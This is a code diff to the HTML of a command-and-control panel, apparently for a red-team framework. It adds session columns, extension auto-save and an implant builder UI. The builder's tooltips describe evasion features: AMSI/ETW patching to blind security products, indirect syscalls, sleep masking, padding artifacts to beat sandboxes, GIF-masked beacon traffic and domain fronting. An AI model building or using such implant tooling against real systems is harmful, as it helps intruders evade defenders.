@@ -347,6 +347,28 @@
             <p class="page-subtitle">Active agent connections</p>
           </div>
           <div class="page-actions">
+            <!-- Column / IP display config: hover or click the 3 dots -->
+            <div id="sessions-cols-menu-wrap" class="log-menu-wrap">
+              <button id="sessions-cols-menu-btn" type="button" class="btn btn-ghost btn-sm"
+                      title="Columns &amp; IP display">
+                <i class="fas fa-ellipsis-v"></i>
+              </button>
+              <div id="sessions-cols-menu" class="log-dropdown hidden">
+                <label class="log-dropdown-item" title="Resolve the country from the IP and show its flag (public IPs only)">
+                  <input type="checkbox" data-col="flag">
+                  <span>Flag next to IP</span>
+                </label>
+                <label class="log-dropdown-item" title="Mask the IP except its last group of digits, e.g. ***.***.***.42">
+                  <input type="checkbox" data-col="maskIp">
+                  <span>Hide IP (last digits only)</span>
+                </label>
+                <div style="border-top:1px solid var(--border);margin:2px 0;"></div>
+                <label class="log-dropdown-item"><input type="checkbox" data-col="os"><span>OS</span></label>
+                <label class="log-dropdown-item"><input type="checkbox" data-col="scripts"><span>Scripts</span></label>
+                <label class="log-dropdown-item"><input type="checkbox" data-col="hwid"><span>HWID</span></label>
+                <label class="log-dropdown-item"><input type="checkbox" data-col="evasion"><span>Evasion</span></label>
+              </div>
+            </div>
             <button onclick="window.API.refreshHosts()" class="btn btn-ghost btn-sm">
               <i class="fas fa-sync"></i><span class="hide-mobile"> Refresh</span>
             </button>
@@ -362,9 +384,10 @@
                   <th>ID</th>
                   <th>Hostname</th>
                   <th>IP Address</th>
-                  <th>OS</th>
-                  <th>HWID</th>
-                  <th>Scripts</th>
+                  <th class="col-os">OS</th>
+                  <th class="col-hwid">HWID</th>
+                  <th class="col-scripts">Scripts</th>
+                  <th class="col-evasion">Evasion</th>
                   <th style="text-align:right;">Actions</th>
                 </tr>
               </thead>
@@ -963,7 +986,7 @@
                      class="form-input form-mono" style="font-size:11px;width:100%;"
                      oninput="window.ExtManager.filterList()">
             </div>
-            <div id="ext-list" style="flex:1;overflow-y:auto;">
+            <div id="ext-list" style="flex:1;min-height:0;overflow-y:auto;">
               <p class="text-gray-500 text-xs italic p-3 text-center">Loading…</p>
             </div>
           </div>
@@ -990,6 +1013,30 @@
                       title="Push this extension to the selected session (ext:load)">
                 <i class="fas fa-upload mr-1"></i>Deploy
               </button>
+              <!-- Auto-save config: hover or click the 3 dots -->
+              <div id="ext-autosave-menu-wrap" class="log-menu-wrap">
+                <button id="ext-autosave-menu-btn" type="button"
+                        class="btn btn-ghost btn-sm" style="font-size:11px;padding:4px 10px;"
+                        title="Auto-save settings">
+                  <i class="fas fa-ellipsis-v"></i>
+                </button>
+                <div id="ext-autosave-menu" class="log-dropdown hidden">
+                  <label class="log-dropdown-item" title="Automatically sync changes to the server while editing">
+                    <input type="checkbox" id="ext-autosave-toggle">
+                    <span>Auto-save changes</span>
+                  </label>
+                  <div class="log-dropdown-item" style="cursor:default;"
+                       title="Seconds between automatic saves (2 - 300)">
+                    <span style="color:var(--text-muted);">Every</span>
+                    <input type="number" id="ext-autosave-interval" min="2" max="300" step="1"
+                           class="form-input" style="width:62px;padding:2px 6px;font-size:12px;">
+                    <span style="color:var(--text-muted);">sec</span>
+                  </div>
+                  <div style="font-size:10px;color:var(--text-muted);padding:4px 10px 2px;border-top:1px solid var(--border);">
+                    Saves only when there are unsaved changes.
+                  </div>
+                </div>
+              </div>
             </div>
             <textarea id="ext-code-editor" class="form-input form-mono"
                       style="flex:1;resize:none;border:none;border-radius:0;font-size:12px;
@@ -1022,6 +1069,18 @@
               <span class="card-title"><i class="fas fa-sliders-h"></i> Build Configuration</span>
             </div>
             <div class="card-body" style="display:flex;flex-direction:column;gap:14px;">
+              <div style="display:flex;border:1px solid var(--border);border-radius:var(--r-md);overflow:hidden;">
+                <button type="button" id="builder-mode-simplified" class="builder-mode-btn active"
+                        onclick="window.BuilderManager.setMode('simplified')"
+                        title="Simplified mode shows only the fields needed for a standard build: C2 address, platform, transport, format and artifact customization. All optional configuration lives in Advanced mode.">
+                  Simplified
+                </button>
+                <button type="button" id="builder-mode-advanced" class="builder-mode-btn"
+                        onclick="window.BuilderManager.setMode('advanced')"
+                        title="Advanced mode exposes every option on top of the core fields: traffic shaping, timing, evasion, execution guardrails, TLS certificate pinning, Authenticode signing and hibernation mode. Each group collapses when you don't need it.">
+                  Advanced
+                </button>
+              </div>
               <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
                 <div>
                   <label class="form-label">Server Host <span style="color:var(--red);">*</span>
@@ -1044,7 +1103,7 @@
               <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px;">
                 <div>
                   <label class="form-label">Platform
-                    <i class="fas fa-circle-question" style="color:var(--text-muted);cursor:help;" title="Target OS/arch. musl builds are fully static and run on any distro (no glibc dependency)."></i>
+                    <i class="fas fa-circle-question" style="color:var(--text-muted);cursor:help;" title="Target OS and architecture of the agent. musl builds are fully static and run on any distro — no glibc dependency — so pick 'Linux x64 (musl static)' when the target distro is unknown, old, or mixed. Windows-only formats (dll/service/shellcode) force this to Windows x64."></i>
                   </label>
                   <select id="builder-platform" class="form-select"
                           title="Target platform. musl = fully static Linux binary that runs on any distro.">
@@ -1088,6 +1147,16 @@
                   </select>
                 </div>
               </div>
+
+              <!-- Format-specific options - auto-opens when the selected format has any -->
+              <div class="collapse-section">
+                <div class="collapse-header" onclick="window.BuilderManager.toggleSection('builder-fmt-opts-body', this)">
+                  <span>Format Options <span style="color:var(--text-muted);font-weight:400;text-transform:none;letter-spacing:0;">(shellcode / PIC C / pipeline)</span>
+                    <i class="fas fa-circle-question" onclick="event.stopPropagation()" style="color:var(--text-muted);cursor:help;font-size:10px;" title="Options that only apply to the selected artifact format: sRDI-style shellcode conversion (export hash, loader flags, output encoding), custom position-independent C source for format=pic_c, and the byte-transform pipeline for format=bin. This section opens automatically when the chosen format has options."></i>
+                  </span>
+                  <i class="fas fa-chevron-down collapse-chevron"></i>
+                </div>
+                <div id="builder-fmt-opts-body" class="collapse-body hidden" style="display:flex;flex-direction:column;gap:10px;">
 
               <!-- Shellcode options - only relevant for format=shellcode (Windows x64) -->
               <div id="builder-shellcode-opts" style="display:none;border:1px solid var(--border,#333);border-radius:8px;padding:10px;">
@@ -1159,6 +1228,19 @@
                 </div>
               </div>
 
+                </div>
+              </div>
+
+              <!-- Traffic & Timing - collapsed by default -->
+              <div class="collapse-section">
+                <div class="collapse-header" onclick="window.BuilderManager.toggleSection('builder-timing-body', this)">
+                  <span>Traffic &amp; Timing
+                    <i class="fas fa-circle-question" onclick="event.stopPropagation()" style="color:var(--text-muted);cursor:help;font-size:10px;" title="How the agent talks and when. The traffic profile shapes C2 traffic to blend in (raw channel, HTTP POST bodies, or HTTP hidden in GIF image requests). Sleep is the base interval between check-ins in seconds; jitter adds a random 0-N millisecond delay on top of every sleep so the beacon timing isn't perfectly predictable."></i>
+                  </span>
+                  <i class="fas fa-chevron-down collapse-chevron"></i>
+                </div>
+                <div id="builder-timing-body" class="collapse-body hidden" style="display:flex;flex-direction:column;gap:10px;">
+
               <div>
                 <label class="form-label">Traffic Profile
                   <i class="fas fa-circle-question" style="color:var(--text-muted);cursor:help;" title="Malleable C2 traffic shaping baked into the agent (default raw channel, HTTP POST, or HTTP with GIF masking)."></i>
@@ -1194,6 +1276,19 @@
                 </div>
               </div>
 
+                </div>
+              </div>
+
+              <!-- Build Options - collapsed by default -->
+              <div class="collapse-section">
+                <div class="collapse-header" onclick="window.BuilderManager.toggleSection('builder-buildopts-body', this)">
+                  <span>Build Options
+                    <i class="fas fa-circle-question" onclick="event.stopPropagation()" style="color:var(--text-muted);cursor:help;font-size:10px;" title="Post-processing switches. Bloat pads the artifact with random bytes up to the target size in MB to defeat size-based detection and some sandboxes. Kill date makes the agent self-terminate N days after the build (0 = never). Debug mode enables verbose agent-side logging — development use only, never deploy a debug build to a real target."></i>
+                  </span>
+                  <i class="fas fa-chevron-down collapse-chevron"></i>
+                </div>
+                <div id="builder-buildopts-body" class="collapse-body hidden" style="display:flex;flex-direction:column;gap:10px;">
+
               <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;align-items:end;">
                 <div>
                   <label class="form-label">Bloat (MB)
@@ -1209,9 +1304,25 @@
                 </div>
               </div>
 
-              <!-- ── Artifact Customization ──────────────────────────── -->
+              <label class="check-label" title="Build with debug logging; do not deploy debug builds to real targets.">
+                <input type="checkbox" id="builder-debug">
+                Debug mode
+              </label>
+
+                </div>
+              </div>
+
+              <!-- ── Artifact Customization (always visible) ─────────── -->
               <div style="border-top:1px solid var(--border);padding-top:14px;">
-                <div style="color:var(--accent);font-size:11px;letter-spacing:.06em;text-transform:uppercase;margin-bottom:10px;font-weight:600;">Artifact Customization</div>
+                <div style="display:flex;align-items:center;justify-content:space-between;gap:8px;margin-bottom:10px;">
+                  <span style="color:var(--accent);font-size:11px;letter-spacing:.06em;text-transform:uppercase;font-weight:600;">Artifact Customization
+                    <i class="fas fa-circle-question" style="color:var(--text-muted);cursor:help;font-size:10px;" title="Controls what the artifact looks like on disk and in file properties: output filename (extension added automatically), embedded icon, PE version info stamped into the Windows Properties dialog, or an ELF .comment string readable via readelf on Linux. The dice button fills all platform-relevant fields with plausible, backend-valid randomized values."></i>
+                  </span>
+                  <button type="button" class="btn btn-ghost btn-sm" onclick="window.BuilderManager.randomizeArtifact()"
+                          title="Fill the artifact fields below with randomized, plausible values matching the selected platform.">
+                    <i class="fas fa-dice"></i> Randomize
+                  </button>
+                </div>
                 <div style="display:flex;flex-direction:column;gap:10px;">
                   <div>
                     <label class="form-label">Artifact filename <span style="color:var(--text-muted);font-weight:400;">(optional - extension added automatically)</span>
@@ -1260,32 +1371,37 @@
                     </label>
                     <input type="text" id="builder-elf-comment" placeholder="e.g. build id or provenance string" class="form-input form-mono" title="String embedded in the ELF .comment section.">
                   </div>
-                  <div>
-                    <label class="form-label">Custom TLS certs bundle <span style="color:var(--text-muted);font-weight:400;">(optional - all three files required)</span>
-                      <i class="fas fa-circle-question" style="color:var(--text-muted);cursor:help;" title="Replace the embedded mTLS identity: ca.crt, client.crt, client.key.der. All three required; stock certs are restored after the build."></i>
-                    </label>
-                    <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px;">
-                      <input type="file" id="builder-certs-ca" accept=".crt,.pem" class="form-input" title="ca.crt">
-                      <input type="file" id="builder-certs-client" accept=".crt,.pem" class="form-input" title="client.crt">
-                      <input type="file" id="builder-certs-key" accept=".der" class="form-input" title="client.key.der">
+                  <!-- TLS-related: collapsed by default, Advanced mode only -->
+                  <div class="artifact-sub-collapse">
+                    <div class="collapse-header" style="border:1px solid var(--border);margin:0;" onclick="window.BuilderManager.toggleSection('builder-tls-body', this)">
+                      <span>Custom TLS certs bundle <span style="color:var(--text-muted);font-weight:400;text-transform:none;letter-spacing:0;">(optional - all three files required)</span>
+                        <i class="fas fa-circle-question" onclick="event.stopPropagation()" style="color:var(--text-muted);cursor:help;font-size:10px;" title="Replaces the mTLS identity compiled into the agent: CA certificate, client certificate, and DER-encoded client key. All three files are required together — a partial bundle is rejected before the build starts. Stock certificates are restored after the build so later builds keep working."></i>
+                      </span>
+                      <i class="fas fa-chevron-down collapse-chevron"></i>
                     </div>
-                    <div class="text-xs" style="opacity:.7;margin-top:4px;">
-                      ca.crt, client.crt, client.key.der - embedded at compile time; stock certs are restored after the build.
+                    <div id="builder-tls-body" class="collapse-body hidden" style="padding:10px 2px 0;">
+                      <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px;">
+                        <input type="file" id="builder-certs-ca" accept=".crt,.pem" class="form-input" title="ca.crt">
+                        <input type="file" id="builder-certs-client" accept=".crt,.pem" class="form-input" title="client.crt">
+                        <input type="file" id="builder-certs-key" accept=".der" class="form-input" title="client.key.der">
+                      </div>
+                      <div class="text-xs" style="opacity:.7;margin-top:4px;">
+                        ca.crt, client.crt, client.key.der - embedded at compile time; stock certs are restored after the build.
+                      </div>
                     </div>
                   </div>
                 </div>
               </div>
 
-              <label class="check-label" title="Build with debug logging; do not deploy debug builds to real targets.">
-                <input type="checkbox" id="builder-debug">
-                Debug mode
-              </label>
-
-              <!-- ── Evasion (Windows-only behavior) ────────────────── -->
-              <div style="border-top:1px solid var(--border);padding-top:14px;" data-platforms="windows">
-                <div style="color:var(--accent);font-size:11px;letter-spacing:.06em;text-transform:uppercase;margin-bottom:10px;font-weight:600;">Evasion
-                  <i class="fas fa-circle-question" style="color:var(--text-muted);cursor:help;font-size:10px;" title="Windows-only behavior; on Linux/macOS the agent ignores these and degrades to plain sleep."></i>
+              <!-- ── Evasion (Windows-only behavior) - collapsed by default ── -->
+              <div class="collapse-section" data-platforms="windows">
+                <div class="collapse-header" onclick="window.BuilderManager.toggleSection('builder-evasion-body', this)">
+                  <span>Evasion
+                    <i class="fas fa-circle-question" onclick="event.stopPropagation()" style="color:var(--text-muted);cursor:help;font-size:10px;" title="Windows-only in-memory evasion baked into the agent. Sleep masking hides the agent while it idles (Ekko = timer-queue image encryption, spoofed stack = fiber-based call-stack spoofing). Indirect syscalls bypass userland hooks, AMSI/ETW patching blinds security products at start, and heap encryption protects agent memory while sleeping. On Linux/macOS these are ignored and the agent degrades to plain sleep."></i>
+                  </span>
+                  <i class="fas fa-chevron-down collapse-chevron"></i>
                 </div>
+                <div id="builder-evasion-body" class="collapse-body hidden">
                 <div style="margin-bottom:10px;">
                   <label class="form-label">Sleep mask
                     <i class="fas fa-circle-question" style="color:var(--text-muted);cursor:help;" title="How the agent hides while sleeping between check-ins. none = plain sleep, no masking; ekko = timer-queue based image encryption; spoofed-stack = fiber-based call-stack spoofing."></i>
@@ -1315,12 +1431,18 @@
                     Heap encryption
                   </label>
                 </div>
+                </div>
               </div>
 
-              <!-- ── Execution Guardrails ────────────────────────────── -->
-              <div style="border-top:1px solid var(--border);padding-top:14px;">
-                <div style="color:var(--accent);font-size:11px;letter-spacing:.06em;text-transform:uppercase;margin-bottom:10px;font-weight:600;">Execution Guardrails</div>
-                <div style="display:flex;flex-direction:column;gap:10px;">
+              <!-- ── Execution Guardrails - collapsed by default ─────── -->
+              <div class="collapse-section">
+                <div class="collapse-header" onclick="window.BuilderManager.toggleSection('builder-guardrails-body', this)">
+                  <span>Execution Guardrails
+                    <i class="fas fa-circle-question" onclick="event.stopPropagation()" style="color:var(--text-muted);cursor:help;font-size:10px;" title="Build-time target lock-in: the agent silently decoy-exits unless every configured constraint matches at runtime — domain glob (e.g. CORP*), hostname glob (e.g. DESKTOP-*), the active-hours window in target-local time, 'not running as SYSTEM/root', and the parent-process allowlist (Windows). Works on every platform; use it to keep an implant from executing outside the intended environment."></i>
+                  </span>
+                  <i class="fas fa-chevron-down collapse-chevron"></i>
+                </div>
+                <div id="builder-guardrails-body" class="collapse-body hidden" style="display:flex;flex-direction:column;gap:10px;">
                   <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
                     <div>
                       <label class="form-label">Domain filter <span style="color:var(--text-muted);font-weight:400;">(glob, blank = any)</span>
@@ -1364,13 +1486,15 @@
                 </div>
               </div>
 
-              <!-- ── Advanced ────────────────────────────────────────── -->
-              <div style="border-top:1px solid var(--border);padding-top:14px;">
-                <div style="color:var(--accent);font-size:11px;letter-spacing:.06em;text-transform:uppercase;margin-bottom:10px;font-weight:600;cursor:pointer;user-select:none;"
-                     onclick="document.getElementById('builder-advanced').classList.toggle('hidden')">
-                  Advanced <i class="fas fa-chevron-down" style="font-size:9px;"></i>
+              <!-- ── Advanced - collapsed by default ─────────────────── -->
+              <div class="collapse-section">
+                <div class="collapse-header" onclick="window.BuilderManager.toggleSection('builder-advanced', this)">
+                  <span>Advanced
+                    <i class="fas fa-circle-question" onclick="event.stopPropagation()" style="color:var(--text-muted);cursor:help;font-size:10px;" title="Infrequently needed switches: Authenticode signing (own .pfx or throwaway self-signed, with optional signature name/URL/CN and RFC 3161 timestamping), TLS SNI and ALPN overrides for domain fronting, hibernation mode (dweller agent that disconnects between task batches — not compatible with HTTP(S) transport), wake batch size, an automatic TCP pivot listener port, and the VM/hypervisor check (allow for cloud VPS targets)."></i>
+                  </span>
+                  <i class="fas fa-chevron-down collapse-chevron"></i>
                 </div>
-                <div id="builder-advanced" class="hidden" style="display:flex;flex-direction:column;gap:10px;">
+                <div id="builder-advanced" class="collapse-body hidden" style="display:flex;flex-direction:column;gap:10px;">
                   <label class="check-label" data-platforms="windows" title="Sign the PE with osslsigncode. Windows exe/dll/service only.">
                     <input type="checkbox" id="builder-sign" checked>
                     Authenticode signing <span style="color:var(--text-muted);font-size:11px;">(Windows exe/dll/service; blank cert path = throwaway self-signed)</span>
@@ -1457,16 +1581,31 @@
 
           <!-- Log -->
           <div class="card" style="display:flex;flex-direction:column;">
-            <div class="card-header" style="display:flex;align-items:center;justify-content:space-between;gap:8px;flex-wrap:wrap;">
-              <span class="card-title"><i class="fas fa-terminal" style="color:var(--accent);"></i> Build Log</span>
-              <div id="builder-log-filters" style="display:none;gap:5px;align-items:center;">
-                <button id="blf-all"  class="btn btn-ghost btn-sm" onclick="window.BuilderManager.filterLog('all')">All</button>
-                <button id="blf-info" class="btn btn-ghost btn-sm" onclick="window.BuilderManager.filterLog('info')">Info</button>
-                <button id="blf-warn" class="btn btn-ghost btn-sm" onclick="window.BuilderManager.filterLog('warn')">Warnings</button>
-                <button id="blf-ok"   class="btn btn-ghost btn-sm" onclick="window.BuilderManager.filterLog('ok')">Success</button>
+            <div class="card-header">
+              <span class="card-title"><i class="fas fa-terminal" style="color:var(--accent);"></i> Build Log
+                <i class="fas fa-circle-question" style="color:var(--text-muted);cursor:help;font-size:10px;" title="Live compiler output for the active build job, newest at the bottom. The menu (top right) pins the view to the newest line as output arrives and copies the entire log to the clipboard. Older lines scroll off after 50 entries."></i>
+              </span>
+              <div class="log-menu-wrap">
+                <button type="button" id="builder-log-menu-btn" class="btn btn-ghost btn-sm"
+                        onclick="window.BuilderManager.toggleLogMenu(event)"
+                        title="Log options">
+                  <i class="fas fa-ellipsis-v"></i>
+                </button>
+                <div id="builder-log-menu" class="log-dropdown hidden">
+                  <label class="log-dropdown-item" title="Always scroll to the newest line as output arrives.">
+                    <input type="checkbox" id="builder-log-anchor" checked
+                           onchange="window.BuilderManager.setLogAnchor(this.checked)">
+                    Anchor to bottom
+                  </label>
+                  <button type="button" class="log-dropdown-item"
+                          onclick="window.BuilderManager.copyLog()"
+                          title="Copy the full visible log buffer to the clipboard.">
+                    <i class="fas fa-copy" style="color:var(--text-muted);"></i> Copy entire log
+                  </button>
+                </div>
               </div>
             </div>
-            <div id="builder-log" class="log-pane" style="flex:1;min-height:260px;border-radius:0 0 var(--r-lg) var(--r-lg);">
+            <div id="builder-log" class="log-pane" style="border-radius:0 0 var(--r-lg) var(--r-lg);">
               <div class="log-default" style="font-style:italic;">Waiting for build to start...</div>
             </div>
           </div>
@@ -1498,7 +1637,9 @@
         <!-- Previous builds -->
         <div class="card">
           <div class="card-header">
-            <span class="card-title"><i class="fas fa-history"></i> Previous Builds</span>
+            <span class="card-title"><i class="fas fa-history"></i> Previous Builds
+              <i class="fas fa-circle-question" style="color:var(--text-muted);cursor:help;font-size:10px;" title="Every build job with its status, start/finish times and actions. Times show your browser's local timezone — click a time to flip it to UTC and back. Actions: download the artifact (green), copy the unauthenticated public link (cyan), or reopen the full log (gray)."></i>
+            </span>
           </div>
           <div class="table-scroll-wrapper">
             <table class="data-table">
@@ -1927,6 +2068,7 @@ window.MobileMore = {
 <script src="/panel/js/shortcuts.js"></script>
 <script src="/panel/js/recon.js"></script>
 <script src="/panel/js/notes.js"></script>
+<script src="/panel/js/builder/randomize.js"></script>
 <script src="/panel/js/builder.js"></script>
 <script src="/panel/js/users.js"></script>
 <script src="/panel/js/loot.js"></script>
